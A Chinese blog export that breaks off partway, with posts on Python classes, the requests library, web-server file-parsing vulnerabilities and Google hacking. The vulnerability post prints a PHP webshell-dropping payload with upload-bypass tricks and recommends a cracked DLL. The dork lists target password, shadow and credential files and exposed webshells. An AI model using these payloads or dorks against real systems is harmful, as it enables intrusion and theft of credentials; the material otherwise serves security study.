1.\n面向对象编程可以看成是不同对象的相互调用，基本思想为类和实例，必须牢记类是抽象的模板，比如Student类，而实例是根据类创建出来的一个个具体的“对象”，每个对象都拥有相同的方法，但各自的数据可能不同。\n![image](http://ww3.sinaimg.cn/large/0060lm7Tly1fpmvjxjg5nj30qq0gjn2b.jpg)\n###### 2.\n类通过关键字class定义，类名以大写字母开头，紧接着是(object)，表示该类是从哪个类继承下来的。有了类就可以创建具体的实例，实例用类名＋（）\n```\nclass Person(object):\n    pass  #pass能够创建一个最简单的类\nxiaoming = Person()\nxiaohong = Person()\nprint xiaoming\nprint xiaohong\nprint xiaoming==xiaohong\n>>><__main__.Person object at 0x7fb705015450>  #结果中出现的__main__意思是，调用模块本身\n\t<__main__.Person object at 0x7fb704f54ad0>\n\tFalse # 说明两个实例并不相同\n```\n关于为什么要继承object类[https://www.zhihu.com/question/19754936]   \n###### 3.\n实例的属性使用实例,属性表示，在定义 Person 类时，可以为Person类添加一个特殊的__init__()方法，当创建实例时，__init__()方法被自动调用，我们就能在此为每个实例都统一属性\n```\nclass Person(object):\n    def __init__(self, name, gender, birth):\n        self.name = name\n        self.gender = gender\n        self.birth = birth\n```\n__init__() 方法的第一个参数必须是 self（也可以用别的名字，但建议使用习惯用法），后续参数则可以自由指定，和定义函数没有任何区别\n###### 4.\n关于访问限制，在属性前面加上__，如__job该属性就无法被外部访问到，而__job__作为特殊属性可以被外部访问，_job也可以被外部访问\n###### 5.\n实例属性每个实例各自拥有，互相独立，而类属性有且只有一份，该类下的实例都可以使用类属性，在内部函数中调用类属性，需要使用类名.类属性名，当实例属性和类属性重名时，实例属性优先级高，它将屏蔽掉对类属性的访问\n```\nclass Person(object):\n    address = 'Earth'  #定义类属性\n    def __init__(self, name):   #定义实例属性\n        self.name = name\n```\n###### 6.\n```\nclass Student(object):\n    ...\n    def set_score(self, score):\n        if 0 <= score <= 100:\n            self.__score = score\n        else:\n            raise ValueError('bad score')  #可以对参数做检查，避免传入无效的参数\n```\n###### 7.\n方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据\n###### 8.\n在面向对象的程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class），对于前面的类，括号里面的object就是他们的父类，子类继承父类全部功能\n![image](http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvkggipfj30k90but8p.jpg)\n###### 9.\n加强记忆，一种类的实例可以应用这个类里面的函数\n```\nclass Timer(object):\n    def run(self):\n        print(' Timer is  Start...')\ndog=Timer()\ndog.run()   #实例dog应用了Timer类中的Run函数\n```","tags":["python"]},{"title":"python：requests模块介绍","url":"/2018/03/23/python：requests模块介绍/","content":"## 发送请求\n使用 Requests 发送网络请求非常简单。\n一开始要导入 Requests 模块：\n```\n>>> import requests\n```\n然后，尝试获取某个网页。本例子中，我们来获取 Github 的公共时间线：\n```\n>>>r= requests.get('https://github.com/timeline.json')\n```\n现在，我们有一个名为 r 的 Response 对象。我们可以从这个对象中获取所有我们想要的信息。\nRequests 简便的 API 意味着所有 HTTP 请求类型都是显而易见的。例如，你可以这样发送一个 HTTP POST 请求：\n```\n>>> r = requests.post(\"http://httpbin.org/post\")\n```\n漂亮，对吧？那么其他 HTTP 请求类型：PUT，DELETE，HEAD 以及 OPTIONS 又是如何的呢？都是一样的简单：\n```\n>>> r = requests.put(\"http://httpbin.org/put\")  \n>>> r = requests.delete(\"http://httpbin.org/delete\")  \n>>> r = requests.head(\"http://httpbin.org/get\")  \n>>> r = requests.options(\"http://httpbin.org/get\")  \n```\n都很不错吧，但这也仅是 Requests 的冰山一角呢。\n## 传递 URL 参数\n你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果你是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码：\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}  \n>>> r = requests.get(\"http://httpbin.org/get\", params=payload)\n```\n通过打印输出该 URL，你能看到 URL 已被正确编码：\n```\n>>> print(r.url)  \nhttp://httpbin.org/get?key2=value2&key1=value1\n```\n注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。\n你还可以将一个列表作为值传入：\n```\n>>> payload = {'key1': 'value1', 'key2': ['value2', 'value3']}  \n\n>>> r = requests.get('http://httpbin.org/get',params=payload)\n> print(r.url)  \nhttp://httpbin.org/get?key1=value1&key2=value2&key2=value3\n```\n## 响应内容\n我们能读取服务器响应的内容。再次以 GitHub 时间线为例：\n```\n>>> import requests  \n>>> r = requests.get('https://github.com/timeline.json')  \n>>> r.text  \nu'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\nRequests 会自动解码来自服务器的内容。大多数 unicode 字符集都能被无缝地解码。\n请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 r.encoding 属性来改变它：\n```\n>>> r.encoding  \n  'utf-8'  \n>>> r.encoding = 'ISO-8859-1'  \n```\n如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding为相应的编码。这样就能使用正确的编码解析 r.text 了。\n在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由 Requests 来为你处理编码。\n二进制响应内容\n你也能以字节的方式访问请求响应体，对于非文本请求：\n```\n>>> r.content  \nb'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\nRequests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。\n例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：\n```\n>>> from PIL import Image  \n>>> from io import BytesIO\n\n>>> i = Image.open(BytesIO(r.content))\n```\n## JSON 响应内容\nRequests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：\n```\n>>> import requests\n\n>>> r = requests.get('https://github.com/timeline.json')  \n>>> r.json()  \n[{u'repository': {u'open_issues': 0, u'url': 'https://github.com/...\n```\n如果 JSON 解码失败， r.json() 就会抛出一个异常。  \n例如，响应内容是 401 (Unauthorized)，尝试访问 r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。  \n需要注意的是，成功调用 r.json() 并不意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 r.raise_for_status() 或者检查 r.status_code 是否和你的期望相同。\n原始响应内容\n在罕见的情况下，你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True。具体你可以这么做：\n```\n>>> r = requests.get('https://github.com/timeline.json', stream=True)  \n>>> r.raw  \n<requests.packages.urllib3.response.HTTPResponse object at 0x101194810>  \n>>> r.raw.read(10)  \n'\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03'  \n```\n但一般情况下，你应该以下面的模式将文本流保存到文件：\n```\nwith open(filename, 'wb') as fd:  \n    for chunk in r.iter_content(chunk_size):  \n        fd.write(chunk)  \n```\n使用 Response.iter\\_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 Note that chunk_size can be freely adjusted to a number that may better fit your use cases.\n## 定制请求头\n如果你想为请求添加 HTTP 头部，只要简单地传递一个 dict 给 headers 参数就可以了。\n例如，在前一个示例中我们没有指定 content-type:\n```\n>>> url = 'https://api.github.com/some/endpoint'\n>>> headers = {'user-agent': 'my-app/0.0.1'}\n\n>>> r = requests.get(url, headers=headers)\n```\n注意: 定制 header 的优先级低于某些特定的信息源，例如：\n如果在 .netrc 中设置了用户认证信息，使用 headers= 设置的授权就不会生效。而如果设置了 auth= 参数，``.netrc`` 的设置就无效了。\n如果被重定向到别的主机，授权 header 就会被删除。\n代理授权 header 会被 URL 中提供的代理身份覆盖掉。\n在我们能判断内容长度的情况下，header 的 Content-Length 会被改写。  \n更进一步讲，Requests 不会基于定制 header 的具体情况改变自己的行为。只不过在最后的请求中，所有的 header 信息都会被传递进去。\n注意: 所有的 header 值必须是 string、bytestring 或者 unicode。尽管传递 unicode header 也是允许的，但不建议这样做。\n更加复杂的 POST 请求\n通常，你想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典在发出请求时会自动编码为表单形式：\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n\n>>> r = requests.post(\"http://httpbin.org/post\", data=payload)\n>>> print(r.text)\n{\n  ...\n  \"form\": {\n    \"key2\": \"value2\",\n    \"key1\": \"value1\"\n  },\n  ...\n}\n```\n你还可以为 data 参数传入一个元组列表。在表单中多个元素使用同一 key 的时候，这种方式尤其有效：\n```\n>>> payload = (('key1', 'value1'), ('key1', 'value2'))\n>>> r = requests.post('http://httpbin.org/post', data=payload)\n>>> print(r.text)\n{\n  ...\n  \"form\": {\n    \"key1\": [\n      \"value1\",\n      \"value2\"\n    ]\n  },\n  ...\n}\n```\n很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict，那么数据会被直接发布出去。\n例如，Github API v3 接受编码为 JSON 的 POST/PATCH 数据：\n```\n>>> import json\n\n>>> url = 'https://api.github.com/some/endpoint'\n>>> payload = {'some': 'data'}\n\n>>> r = requests.post(url, data=json.dumps(payload))\n\n此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：\n>>> url = 'https://api.github.com/some/endpoint'\n>>> payload = {'some': 'data'}\n\n>>> r = requests.post(url, json=payload)\n\nPOST一个多部分编码(Multipart-Encoded)的文件\nRequests 使得上传多部分编码文件变得很简单：\n>>> url = 'http://httpbin.org/post'\n>>> files = {'file': open('report.xls', 'rb')}\n\n>>> r = requests.post(url, files=files)\n>>> r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"<censored...binary...data>\"\n  },\n  ...\n}\n```\n你可以显式地设置文件名，文件类型和请求头：\n```\n>>> url = 'http://httpbin.org/post'\n>>> files = {'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}\n\n>>> r = requests.post(url, files=files)\n>>> r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"<censored...binary...data>\"\n  },\n  ...\n}\n```\n如果你想，你也可以发送作为文件来接收的字符串：\n```\n>>> url = 'http://httpbin.org/post'\n>>> files = {'file': ('report.csv', 'some,data,to,send\\nanother,row,to,send\\n')}\n\n>>> r = requests.post(url, files=files)\n>>> r.text\n{\n  ...\n  \"files\": {\n    \"file\": \"some,data,to,send\\\\nanother,row,to,send\\\\n\"\n  },\n  ...\n}\n```\n如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望将请求做成数据流。默认下 requests 不支持, 但有个第三方包 requests-toolbelt 是支持的。你可以阅读 toolbelt 文档 来了解使用方法。\n在一个请求中发送多文件参考 高级用法 一节。\n警告\n我们强烈建议你用二进制模式(binary mode)打开文件。这是因为 Requests 可能会试图为你提供 Content-Length header，在它这样做的时候，这个值会被设为文件的字节数（bytes）。如果用文本模式(text mode)打开文件，就可能会发生错误。\n## 响应状态码\n我们可以检测响应状态码：\n```\n>>> r = requests.get('http://httpbin.org/get')\n>>> r.status_code\n200\n```\n为方便引用，Requests还附带了一个内置的状态码查询对象：\n```\n>>> r.status_code == requests.codes.ok\nTrue\n```\n如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 Response.raise_for_status() 来抛出异常：\n```\n>>> bad_r = requests.get('http://httpbin.org/status/404')\n>>> bad_r.status_code\n404\n\n>>> bad_r.raise_for_status()\nTraceback (most recent call last):\n  File \"requests/models.py\", line 832, in raise_for_status\n    raise http_error\nrequests.exceptions.HTTPError: 404 Client Error\n```\n但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是：\n```\n>>> r.raise_for_status()\nNone\n```\n一切都挺和谐哈。\n## 响应头\n我们可以查看以一个 Python 字典形式展示的服务器响应头：\n```\n>>> r.headers\n{\n    'content-encoding': 'gzip',\n    'transfer-encoding': 'chunked',\n    'connection': 'close',\n    'server': 'nginx/1.0.4',\n    'x-runtime': '148ms',\n    'etag': '\"e1ca502697e5c9317743dc078f67693f\"',\n    'content-type': 'application/json'\n}\n```\n但是这个字典比较特殊：它是仅为 HTTP 头部而生的。根据 RFC 2616， HTTP 头部是大小写不敏感的。\n因此，我们可以使用任意大写形式来访问这些响应头字段：\n```\n>>> r.headers['Content-Type']\n'application/json'\n\n>>> r.headers.get('content-type')\n'application/json'\n```\n它还有一个特殊点，那就是服务器可以多次接受同一 header，每次都使用不同的值。但 Requests 会将它们合并，这样它们就可以用一个映射来表示出来，参见 RFC 7230:  \nA recipient MAY combine multiple header fields with the same field name into one \"field-name: field-value\" pair, without changing the semantics of the message, by appending each subsequent field value to the combined field value in order, separated by a comma.  \n接收者可以合并多个相同名称的 header 栏位，把它们合为一个 \"field-name: field-value\" 配对，将每个后续的栏位值依次追加到合并的栏位值中，用逗号隔开即可，这样做不会改变信息的语义。\n## Cookie\n如果某个响应中包含一些 cookie，你可以快速访问它们：\n```\n>>> url = 'http://example.com/some/cookie/setting/url'\n>>> r = requests.get(url)\n\n>>> r.cookies['example_cookie_name']\n'example_cookie_value'\n```\n要想发送你的cookies到服务器，可以使用 cookies 参数：\n```\n>>> url = 'http://httpbin.org/cookies'\n>>> cookies = dict(cookies_are='working')\n\n>>> r = requests.get(url, cookies=cookies)\n>>> r.text\n'{\"cookies\": {\"cookies_are\": \"working\"}}'\n```\nCookie 的返回对象为 RequestsCookieJar，它的行为和字典类似，但界面更为完整，适合跨域名跨路径使用。你还可以把 Cookie Jar 传到 Requests 中：\n```\n>>> jar = requests.cookies.RequestsCookieJar()\n>>> jar.set('tasty_cookie', 'yum', domain='httpbin.org', path='/cookies')\n>>> jar.set('gross_cookie', 'blech', domain='httpbin.org', path='/elsewhere')\n>>> url = 'http://httpbin.org/cookies'\n>>> r = requests.get(url, cookies=jar)\n>>> r.text\n'{\"cookies\": {\"tasty_cookie\": \"yum\"}}'\n```\n## 重定向与请求历史\n默认情况下，除了 HEAD, Requests 会自动处理所有重定向。\n可以使用响应对象的 history 方法来追踪重定向。\nResponse.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。\n例如，Github 将所有的 HTTP 请求重定向到 HTTPS：\n```\n>>> r = requests.get('http://github.com')\n\n>>> r.url\n'https://github.com/'\n\n>>> r.status_code\n200\n\n>>> r.history\n[<Response [301]>]\n```\n如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理：\n```\n>>> r = requests.get('http://github.com', allow_redirects=False)\n>>> r.status_code\n301\n>>> r.history\n[]\n```\n如果你使用了 HEAD，你也可以启用重定向：\n```\n>>> r = requests.head('http://github.com', allow_redirects=True)\n>>> r.url\n'https://github.com/'\n>>> r.history\n[<Response [301]>]\n```\n## 超时\n你可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：\n```\n>>> requests.get('http://github.com', timeout=0.001)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nrequests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001)\n```\n注意\ntimeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.\n## 错误与异常\n遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 ConnectionError 异常。\n如果 HTTP 请求返回了不成功的状态码， Response.raise_for_status() 会抛出一个 HTTPError 异常。\n若请求超时，则抛出一个 Timeout 异常。\n若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。\n所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。","tags":["python"]},{"title":"文件解析漏洞学习","url":"/2018/03/03/文件解析漏洞学习/","content":"# 文件解析漏洞学习  \n解析漏洞主要说的是一些特殊文件被IIS、Apache、nginx在某种情况下解释成脚本文件格式的漏洞\n### 一、IIS6.0解析漏洞  \n###### 1.目录解析  \n当文件夹名字以.asp、.asa结尾时，文件夹内的所有文件都将以asp的格式解析，我们就可以想办法修改文件夹名称，再上传任意格式的一句话木马在该文件夹中，从而绕过验证。  \n###### 2.文件解析   \n在IIS中解析文件名，系统通常都是从左到右读取文件名，假如我们上传一个文件1.asp;jpg,在前端验证时直接从后面读取文件名.jpg,上传成功！而在服务器中则是以.asp格式解析。  \n也可以使用bp抓包改包绕过前端验证。  \n还有一种就是利用重定向，在IIS6.0中安装了Rewrite这个ISAPI，下载ISAPIrewrite破解版 点击下载此文件\n安装之后把Cracked里的ISAPI\\_Rewrite.dll，替换掉安装目录里的ISAPI\\_Rewrite.dll，就破解了。注意，停掉IIS再替换！\n\n在httpd.ini加入了以下规则\n\n \n```\n   RewriteRule (.*).asp/(.*) /no.gif  \n   RewriteRule (.*).Asp/(.*) /no.gif   \n   RewriteRule (.*).aSp/(.*) /no.gif  \n   RewriteRule (.*).asP/(.*) /no.gif  \n   RewriteRule (.*).ASp/(.*) /no.gif   \n   RewriteRule (.*).AsP/(.*) /no.gif  \n   RewriteRule (.*).aSP/(.*) /no.gif   \n   RewriteRule (.*).ASP/(.*) /no.gif\n```\n\n\n这样访问所有的带有“.asp/”的URL全部被重写到http://test.com/no.jpg,访问http://test.com/dir.asp/diy.jpg其实就是访问的http://test.com/no.jpg\n这样就屏蔽了所有带.asp的文件夹的访问，并且全部显示no.jpg这张警告的图片\n### 二、Apache解析漏洞  \n与IIS相反，Apache解析文件时是从右往左读取文件名，如果遇到不可解析的文件后缀名就继续向左解析，如1.php.xxx,后面的.xxx是Apache无法解析的后缀，则该文件将被解析为PHP格式  \n### 三、IIS 7.0/IIS 7.5/nginx<8.03畸形解析漏洞  \n在默认fast-CGI开启下，我们将以下内容的PHP文件 \n```\n<?PHP fputs(fopen(’shell.php’,’w’),’<?php eval_r($_POST[cmd])?>’);?>\n```\n修改为jpg文件上传，假如图片路径为http://xxx.com/xxx/1.jpg,我们需要访问地址http://xxx.com/xxx/1.jpg/shell.php,就会在当前xxx路径下生成shell.php文件，文件内容即为<?php eval_r($_POST[cmd])?>，上传一句话木马成功！   \n### 四、Nginx <8.03空字节代码执行漏洞  \n试用版本：0.5.\\*, 0.6.\\*, 0.7 <= 0.7.65, 0.8 <= 0.8.37  \n这个漏洞也是用了%00截断，访问嵌入一句话木马的图 片如xx.jpg改变成xxx.jpg%00.php来执行其中代码  \n### 五、.htaccess文件解析  \n.htaccess是什么？  \n.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。\n在这个漏洞里我们又要利用到<FilesMatch>指令，这个指令是用于包含作用于与正则表达式匹配的文件名，执行此漏洞的前提是Apache中.htaccess可被执行、可被写入。我们写入\n\n```\n<FlilesMatch  \"shell.jpg\"> SetHandler application/x-httpd-php </FlilesMatch>\n```\n再上传shell.jpg的一句话木马，就可以以PHP格式执行。   \n参考：  \n[通杀IIS7.0畸形解析0day漏洞](http://blog.sina.com.cn/s/blog_71f010d20101ljgz.html)  \n[ Nginx %00空字节执行php漏洞](https://www.cnblogs.com/qmfsun/p/6170175.html)  \n[.htaccess重写、安全防护、文件访问权限](https://www.cnblogs.com/kenshinobiy/p/5058430.html)  \n[Apache对文件后缀解析的分析利用](https://www.cnblogs.com/saw2012/archive/2013/05/22/3093583.html)  \n[cracer渗透教程](http://cracer.com/)","tags":["文件解析"]},{"title":"Google hacking利用简介","url":"/2018/02/27/GOOGLE  HAKING/","content":"# GOOGLE HACKING（转）\n\n\n\n##  一.Google Hacking背景：\n\n Google 是全球功能最强大的搜索引擎之一。伴随其强大的功能产生了利用Google 进行的黑客活动——Google Hacking。其攻击范围相当广，包括：国防军事、企业密函、个人财产和安全等等。不怀好意的黑客们往往利用Google去寻找有漏洞的服务器和文件、 口令记录、公开的目录、基于网络的设备管理台等等。由此可见，Google hacking 的巨大的威胁性以及研究的必要性。\n1995年Johnny Long开始研究利用Google来测试网站和电脑的安全隐患，由此而发展了Google hacking，他建立的 http://johnny.ihackstuff.com/  现今成为Google Hacking Data-base。2004年 Robert Masse 和 Jian  Hui Wang全面分析了Google hacking的四大应用，同时给出利用相关工具的例证和防范Google hacking的方法。目前相关的研究报告各自有侧重点，没能够很好的从整体角度来全面的分析Google hacking的产生原因，总体归纳出高级攻击方式和攻击规律，系统的介绍相关应用软件以及防范Google hacking的具体实例。本文将就此利用相关实例具体说明。\n \n## 二.Google Hacking 的常见方式:  \n##### 1. 基本搜索方式\n Google提供了强大的搜索功能：\n \n 常用的基本搜索指令有：  \n （1）逻辑与/或：AND、OR  \n （2）逻辑非：-  \n （3）完整匹配：\"…\"  \n （4）通配符：*  ?  \n  \n##### 2.高级搜索指令\nGoogle高级预定义搜索语法如下：  \nintitle:表示搜索在网页标题中出现第一个关键词的网页。   \n例如“intitle:黑客技术 ”将返回在标题中出现“黑客技术 ”的所有链接。 用“allintitle: 黑客技术 Google”则会返回网页标题中同时含有 “黑客技术” 和 “Google” 的链接。\n\n\nintext:返回网页的文本中出现关键词的网页。用allintext:搜索多个关键字。\n\ninurl:返回的网页链接中包含第一个关键字的网页。\n\nsite:在某个限定的网站中搜索。\n\nfiletype:搜索特定扩展名的文件（如.doc  .pdf .ppt）。   \n黑客们往往会关注特定的文件，例如：.pwl口令文件、.tmp临时文件、.cfg配置文件、.ini系统文件、.hlp帮助文件、.dat 数据文件、.log日志文件、.par交换文件等等。\n \nlink:表示返回所有链接到某个地址的网页。\n\nrelated：返回连接到类似于指定网站的网页。\n \ncache:搜索Google缓存中的网页。\n\ninfo:表示搜索网站的摘要。例如“info:whu.edu.cn”仅得到一个结果： \n\nphonebook: 搜索电话号码簿，将会返回美国街道地址和电话号码列表,这无疑给挖掘个人信息的黑客带来极大的便利。\n\n同时还可以得到住宅的全面信息，结合Google earth将会得到更详细的信息。相应的还有更小的分类搜索：rphonebook:仅搜索住宅用户电话号码簿；bphonebook:仅搜索商业的电话号码簿。\n\n 另外，还有一些不常用的搜索指令。列表如下：（此列表转载自网络）\n author:搜索新闻组帖子的作者。  \n group:搜索Google组搜索词汇帖子的题目。  \n msgid:搜索识别新闻组帖子的Google组信息标识符和字符串。  \n insubject:搜索Google组的标题行。  \n stocks:搜索有关一家公司的股票市场信息。  \n define:返回一个搜索词汇的定义。  \n inanchor:搜索一个HTML标记中的一个链接的文本表现形式。  \n daterange:搜索某个日期范围内Google做索引的网页。  \n \n##### 3. Google hacking常见的攻击规律\n Google hacking主要是发现那些 公告文件，安全漏洞，错误信息， 口令文件， 用户文件， 演示页面，登录页面， 安全文件， 敏感目录，商业信息，漏洞主机， 网站服务器检测等信息。攻击规律有：\n######  A．利用“Index of”语法检索出站点的活动索引目录\n Index 就是主页服务器所进行操作的一个索引目录。黑客们常利用目录获取密码文件和其他安全文件。常用的攻击语法如下：\n Index of /admin 可以挖掘到安全意识不强的管理员的机密文件：\n\n\n 黑客往往可以快速地提取他所要的信息。其他Index of 语法列表如下：（此列表为转载）\n Index of /passwd  \n Index of /password  \n Index of /mail  \n “Index of /” +passwd  \n “Index of /” +password.txt  \n “Index of /” +.htaccess  \n “Index of /secret”  \n “Index of /confidential”  \n “Index of /root”  \n “Index of /cgi-bin”  \n “Index of /credit-card”  \n “Index of /logs”  \n “Index of /config”  \n \n######  B、利用“inurl:”寻找易攻击的站点和服务器\n (1)利用“allinurl:winnt/system32/”寻找受限目录“system32”，一旦具备 cmd.exe 执行权限，就可以控制远程的服务器。\n \n \n (2)利用“allinurl:wwwboard/passwd.txt”搜寻易受攻击的服务器。\n \n (3)利用“inurl:.bash_history”搜寻服务器的“.bash_history”文件。这个文件包括超级管理员的执行命令，甚至一些敏感信息，如管理员口令序列等。例如：\n \n \n (4)利用“inurl:config.txt”搜寻服务器的“config.txt”文件，这个文件包括管理员密码和数据认证签名的hash值。\n \n (5)其他语法的搜索。（如下分类为转载）  \n　　　　inurl:admin filetype:txt  \n　　　　inurl:admin filetype:db  \n　　　　inurl:admin filetype:cfg  \n　　　　inurl:mysql filetype:cfg  \n　　　　inurl:passwd filetype:txt  \n　　　　inurl:iisadmin   \n　　　　allinurl:/scripts/cart32.exe  \n　　　　allinurl:/CuteNews/show_archives.php  \n　　　　allinurl:/phpinfo.php  \n　　　　allinurl:/privmsg.php  \n　　　　allinurl:/privmsg.php  \n　　　　inurl:auth_user_file.txt  \n　　　　inurl:orders.txt  \n　　　　inurl:“wwwroot/*.”  \n　　　　inurl:adpassword.txt  \n　　　　inurl:webeditor.php  \n　　　　inurl:file_upload.php  \n　　　　inurl:gov filetype:xls “restricted”  \n　　　　index of ftp +.mdb allinurl:/cgi-bin/ +mailto　　  \n　　\n######  C、利用“intitle:”寻找易攻击的站点或服务器\n \n （1）利用 intitle:\"php shell*\" \"Enable stderr\" filetype:php查找安装了php webshell后门的主机，并测试是否有能够直接在机器上执行命令的web shell。（http://worldispnetwork.com/phpinfo.php） \n \n  \n （2）利用allintitle:“index of /admin”搜寻服务器的受限目录入口“admin”。\n \n　　（3）其他语法的搜索。（如下分类为转载）  \n　　　　intitle:“Index of” .sh_history  \n　　　　intitle:“Index of” .bash_history  \n　　　　intitle:“index of” passwd  \n　　　　intitle:“index of” people.lst  \n　　　　intitle:“index of” pwd.db  \n　　　　intitle:“index of” etc/shadow  \n　　　　intitle:“index of” spwd  \n　　　　intitle:“index of” master.passwd  \n　　　　intitle:“index of” htpasswd  \n　　　　intitle:“index of” members OR accounts  \n　　　　intitle:“index of” user_carts OR user_cart  \n　　　　allintitle: sensitive filetype:doc  \n　　　　allintitle: restricted filetype :mail  \n　　　　allintitle: restricted filetype:doc site:gov　  \n　　　\n\n Johnny Long在《Google hacking for penetration testers》中详细的介绍Google hacking的常用高级搜索方式，详细列表如下：（此列表转载自网络）\n\nFor site\nsite:csdn.net –www.csdn.net –blog.csdn.net/cnasp  \ninurl:nqt.php intitle: \"network query tool\"  \ninurl:\"/cgi-bin/userreg.cgi\"  \nfiletype:asp \"custom error message\"  \n\"asp.net_sessionid\" \"data source=\"  \nIntext: \"warning:failed opening\" include_path  \n\"http_from=googlebot\" googlebot.com \"server_software\"  \nintitle:\"lantronix web-managerintitle:\"lantronix web-manager\"  \nintitle:\"index of \" back files  \ninurl:admin backup  \nallinurl:admin backup  \nfiletype:doc doc  \ninfo:blog.csdn.net  \nrelated:www.sina.com  \ndefine:ironic  \nsite:blog.csdn.net inurl:csdn  \nintitle:index.of \"parent directory\"  \nintitle:index.of inurl:admin  \nintitle:index.of ws_ftp.log  \nintitle:index.of \"server at\"  \nintitle:index.of inurl:\"admin/*\"  \n \nFor Web Servers  \n\"AnWeb/1.42h\" intitle:index.of  \n\"Apache Tomcat/\" intitle:index.of  \n\"Apche-AdvancedExtranetServer/\" intitle:index.of  \n\"Apach/df-ets\" intitle:index.of  \n\"Apach/\" \"server at\" intitle:index.of  \n\"Apache/AmEuro\" intitle:index.of  \n\"Apache/Blast\" intitle:index.of  \n\"Apache/WWW\" intitle:index.of  \n\"Apache/df-exts\" intitle:index.of  \n\"CERN httpd 3.0B (VAX VMS)\" intitle:index.of  \nfitweb-wwws * server at intitle:index.of  \nHP Apache-based Web \"Server/*\" intitle:index.of  \nOpenSSL/0.9g intitle:index.of  \n\"httpd+ssl/kttd\" * server at intitle:index.of  \n\"JRun Web Server\" intitle:index.of  \n\"MaXX/3.1\" intitle:index.of  \n\"Microsoft-ISS/*\" server at intitle:index.of  \n\"Microsoft-ISS/*\" intitle:index.of  \n\"OmniHTTPd/2.10\" intitle:index.of  \n\"OpenSA/1.0.4\" intitle:index.of  \n\"Oracle HTTP Server Powered by Apache\" intitle:index.of  \n\"Red Hat Secure/*\" server at intitle:index.of  \nSEDWebserver * server at intitle:index.of  \n\"Apache/*\" intitle:index.of  \n\"Apache/*\" server at intitle:index.of  \nfiletype:pst pst(contacts | address | inbox)  \nfiletype:reg reg +intext: \"internet account manager\"  \n \nFor E-Mail Address  \n\"Internal server error\" \"server at\"  \nIntitle:\"execution of this script not permitted\"  \ne-mail address filetype:csv csv  \nintitle:index.of dead.letter  \ninurl:fcgi-bin/echo  \nfiletype:pst pst –from –to –data  \nintitle:inde.of inbox   \nintitle: \"index of \" –inurl:maillog maillog size  \ninurl:email filetype:mdb  \nfiletype:xls inrul: \"email.xls\"  \nfiletype:xls username password email  \nintitle:index.of inbox dbx  \nfiletype:eml eml eml +intext: \"subject\" +intext: \"from\"  \nintitle:index.of inbox dbx  \nfiletype:wab wab  \nfiletype:pst inrul: \"outlook.pst\"  \nfiletype:mbx mbx intext:subject  \ninurl:cgi-bin/printenv  \ninurl:forward filetype:forward –cvs  \nfiletype:mail 